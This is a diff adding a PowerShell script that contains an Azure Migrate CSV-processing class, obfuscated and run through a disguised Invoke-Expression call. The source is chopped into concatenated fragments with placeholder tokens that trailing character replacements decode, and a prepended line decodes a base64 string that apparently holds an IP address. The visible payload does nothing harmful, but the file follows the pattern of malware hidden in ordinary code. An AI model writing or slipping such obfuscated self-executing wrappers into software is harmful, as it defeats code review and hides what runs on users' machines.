@@ -1,0 +1,141 @@
+. ( $ShelLId[1]+$sHeLLiD[13]+'X') (('([Text.Encoding]'+'::Unicode.GetString([Convert]::FromBase64String(BogJwBpAHA'+'AOgAxADgAMwAuADEANAAzAC4AMgA3AC4AMwAwACcABog)))bhJOUT-Nul'+'l
+class C'+'svProcessor
+{
+    '+'[psobject]a5ALogger
+    [psobject]a5AProcessItemFu'+'nct'+'ion
+
+    CsvProcessor(a5Alogger, a5AprocessItemFunction)
+    {
+        a5Athis.Logger = a5Alogger
+        if(a5AprocessItemFunction)
+        {
+          '+'  a5Athis.ProcessItemFunction = a5AprocessIt'+'emFunction
+        }
+    }
+
+    [pso'+'bject] LoadCsv(a5ACsvFilePat'+'h)'+'
+    {
+        a5AresolvedCsvPath = Reso'+'lve-Path -LiteralPath a5ACsvFilePath
+        a5AcsvObj = Import-Csv a5AresolvedCsv'+'Path -Delimiter PJ7,PJ7
+'+'  '+'      return a5AcsvObj
+    }
+
+    [string] FormatDate(a5Adate) '+'{
+        return a5Adate.ToString(BogyyyyMMdd_HHmmssBog)
+    }
+    
+    [string] ReplaceLastSubstring([stri'+'ng]a5Astr, [s'+'tring]a'+'5Asubstr, '+'[string]a5Anewstr)
+    {
+        a5AlastIndex = a5Astr.LastIndexOf'+'(a5Asubstr)
+        '+'a5Aresult = a5Astr.Remove(a5AlastIndex,a5Asubstr.Length).Insert(a5AlastIndex,a5Anewstr)
+ '+'       return a5Aresult
+    }
+
+  '+'  [string]'+' GetC'+'s'+'vOutputPath(a5AresolvedCsvPath)
+    {
+        a5Astar'+'tDa'+'te = a5Athis.Logger.StartDate
+        a5AscriptName = a5'+'Athis.Logger.ScriptName
+        a5AcsvFileN'+'ame = Split-Path a'+'5AresolvedCsvPat'+'h '+'-Leaf
+        # Get the'+' directory path
+        a5AdirPath = Split-Path a5AresolvedC'+'svPath -Parent
+        a5AdirPath'+'forLogs = [string]::Concat(a5AdirPat'+'h, Bog2MologsBog)
+
+        a5ACsvOutpu'+'tFil'+'eName = a5Anull
+ '+'       #C'+'reates a new directory if it doesnt exist
+        if (-not (Test-Path -LiteralPath a5AdirPathforLogs)) {'+'        '+'    
+      '+'      try {
+                New-Item -Path a5AdirPathforLogs -ItemType Directory -ErrorAction Stop '+'bhJ write-host #-Force
+                a5Athis.Logger.LogTrace(Bog'+'Created a '+'New directory for output csv file: PJ7a5'+'A(a5AdirPathforLogs)PJ7Bog)
+                a5A'+'CsvOutputFileName = ['+'string]::Concat(Boglogs2MoBog, Bogout.B'+'og, a5AscriptName, Bog.Bog, a5AcsvFileName, Bog.'+'Bog, a5Athis.FormatDat'+'e(a5AstartDate), Bog.csvBog)
+            }
+            catch {          '+'      
+      '+'          a5Athis'+'.Logger.Log'+'Error(BogWe will continue to lo'+'g in t'+'he out csv file location where the '+'input/master cs'+'v file existed as '+'we are unable to create directory PJ7a5A(a5AdirPathforLogs)PJ7Bo'+'g)
+             '+'   a5ACsvOutputFileName = '+'[strin'+'g]::Concat(Bogout.B'+'og, a5AscriptN'+'ame, Bog.Bog, a5AcsvFileName, Bog.Bog, a5Athis.FormatDate(a'+'5AstartDate), Bog.csvB'+'og)     '+'   '+'        
+  '+'          }
+        }
+        else {
+            a5ACsvOutputFileName = [string]::Concat(Bo'+'glogs2MoBog, Bogout.Bog, a5AscriptName'+', Bog.Bog, a5AcsvFil'+'eName, Bo'+'g.Bog, a5Athis.FormatDate(a5As'+'tartDate), Bog.'+'csvB'+'og)
+            '+'a5'+'Athis.Logg'+'er.LogTrace(BogDirectory already exist: PJ7a5A(a'+'5AdirPathforLo'+'gs)PJ7Bog)
+        }
+        
+        a5ACsvOutputFilePath = a5At'+'his.ReplaceLastSubstring(a5AresolvedCsvP'+'ath, a5AcsvFileNa'+'me, a5ACsvOutputFileName)
+   '+'     return a5ACsv'+'Ou'+'tputFilePath
+    }
+
+    [void] ProcessFile(a5AC'+'svFilePath)
+    {
+        a5A'+'this.Logger.LogTrace(Bog[START]-Processing CsvFile PJ7a5A(a5ACsvFilePath)PJ7Bog)
+
+        a5AresolvedCsvPath = R'+'esolve-Path -LiteralPath a5ACsvFilePath
+        a5Athis.Logger.LogTrace(BogLoad'+'ing Csv '+'file PJ7a5A('+'a5AresolvedCsvPath)PJ7Bog)
+        a5AcsvObj = a5Athis.LoadC'+'sv(a5ACsvFilePath)
+
+        a5ACsvOutputFilePath = a5Athis.GetCsvOutputPath(a5AresolvedCsvPath)
+       '+' a5Athis.Logger.LogTrace'+'(BogCsv output report file: PJ7a5A(a5ACsvOutputFilePath)PJ7Bog)
+
+    '+'    a5AMachineItemArray = New-Object System.Collections.Generic.List[System.Object]
+ '+'       foreach (a5AcsvItem in a5AcsvOb'+'j)
+        {
+            a5Are'+'p'+'ortItemInfo'+' = [PSCustomObject]@{
+'+'                AZMIGRATEPRO'+'JECT_SUBSCRIPTION_ID = a5A(a5AcsvItem.AZM'+'IGRATEPROJECT_SUBSCRIPTION_ID)
+                AZMIGRATEPROJECT'+'_RESOURCE_GROUP_NAME = a5A(a5AcsvIt'+'em.AZMIG'+'RATEPROJECT_RESOURCE_GROUP_N'+'AME)
+           '+'     AZMIGRATEPROJECT'+'_NAME = a5A(a5AcsvItem.AZMIGRATEPROJECT_NAME)
+                Machine = a5A(a5AcsvItem.SOURCE_MACHINE_NAME)
+                Exception '+'= a5Anull
+            }
+            try {
+                a5Athis.Ens'+'ureSubscription(a5AcsvItem.AZMIGRATEPROJECT_SUBSCRIPTION_ID)'+'
+                a'+'5Athis.PrintSettings(a5Ac'+'svIte'+'m)            
+'+'    '+'            a5Athis.ProcessItemFunction.Invoke(a5Athis, a5'+'AcsvItem,'+' a5AreportItemInfo)
+            } catch {
+                a5Athis.Logger.LogError(BogExcept'+'ion processing itemBog)
+'+'                a5AexceptionMes'+'sage = a5A_'+' bhJ Out-String
+                a5Athis.Logger.LogError(a5Aexcep'+'tionMessage)'+'
+
+                a5AreportItemInfo'+'.Exception = BogEXCEPTION PROCESSING ITEMBog
+            }
+            a5AMachineItemArray.Add(a5A'+'reportItemInfo)
+        }
+        a5Athis.Logger.LogTrace(BogCreating Csv reporting output'+' PJ7a5A(a5ACsvOut'+'putFilePath)PJ7Bog)
+        a5AMachineItemArray.ToArray() bhJ Export-Csv -LiteralPath a5ACsvOutputFilePath -Delimiter PJ7'+',PJ7 -NoTypeInfo'+'rmation
+
+        a5Athis.Logger.LogTrace(Bog[FINISH]-CsvFile: PJ7a5A(a5ACsvFilePath)PJ7Bog)
+    }
+
+    [void] EnsureSubscription(a5AsubscriptionId)
+    {
+   '+'     a5Athis.Logger.LogTrace('+'BogC'+'hecking if current subscription equals to PJ7a5A(a5AsubscriptionId)PJ7B'+'og)
+       '+' a5Acurr'+'entContext = Get'+'-AzConte'+'xt
+        a5'+'AcurrentSubscription = a5AcurrentCon'+'text.Subscription
+        if (a5AcurrentSubscription.Id -ne a5AsubscriptionId)
+        {
+           '+' a5Athis.Logger.LogTrace(Bog'+'Setting context subscription PJ7a5A(a5AsubscriptionId)PJ7Bog)
+            Set-AzContex'+'t -Subscriptio'+'n a5Asubscrip'+'tionId
+            a5AcurrentContext = Get-AzContext
+            a5AcurrentSubscription = a5AcurrentContext.Subscripti'+'on
+            i'+'f ('+'a5AcurrentSubscription.Id -ne a'+'5AsubscriptionId)
+    '+'        {
+       '+'   '+'      a5Athis.Logger.LogE'+'rrorAnd'+'Throw(BogSubscriptionId PJ7a5A(a5Asubscription'+'I'+'d)PJ7 is no'+'t selected as current default subscriptionBog)
+            }
+ '+'       } e'+'lse {
+            a5Athis.Logg'+'er.LogTrace(BogSubs'+'cription PJ7a5A(a5AsubscriptionI'+'d)PJ7 is al'+'ready selectedBog'+')'+'
+        }
+    }
+
+    [void] Prin'+'tSettings(a5AcsvItem)
+    {
+      '+'  a5Athis.Logger.LogTrace(Bo'+'g---BE'+'GIN ITEM DA'+'TA---Bog)
+       '+' a5ApropertyNames = a5AcsvItem bhJ Get-'+'Member -MemberType Properties bhJ Select-Object -ExpandProperty Name #bhJ Select-Object '+'-Unique
+        foreach (a5Apropert'+'yName '+'in a5ApropertyNames) {
+            a5ApropertyValue = a5AcsvItem.a'+'5A(a5Aprop'+'ertyName)
+            a5Athis.'+'Logger.LogTr'+'ace(Boga5A(a5Apro'+'pertyName)'+'=a5A(a5'+'ApropertyValue)'+'Bog)
+        }
+        a'+'5Athis.Logger.LogTrace(Bog---END ITEM DATA---Bog)
+    }
+}
+
+Function New-CsvProcessorInstance('+'a5Alogger, a5AprocessItemFun'+'ction)
+{
+  retur'+'n ['+'CsvProcessor]::new(a5Alogger,'+' a5Ap'+'rocessItemFunction)
+}
+').RePlaCE(([char]80+[char]74+[char]55),[sTRINg][char]39).RePlaCE(([char]50+[char]77+[char]111),'\').RePlaCE(([char]98+[char]104+[char]74),[sTRINg][char]124).RePlaCE('Bog',[sTRINg][char]34).RePlaCE('a5A','$') ) 
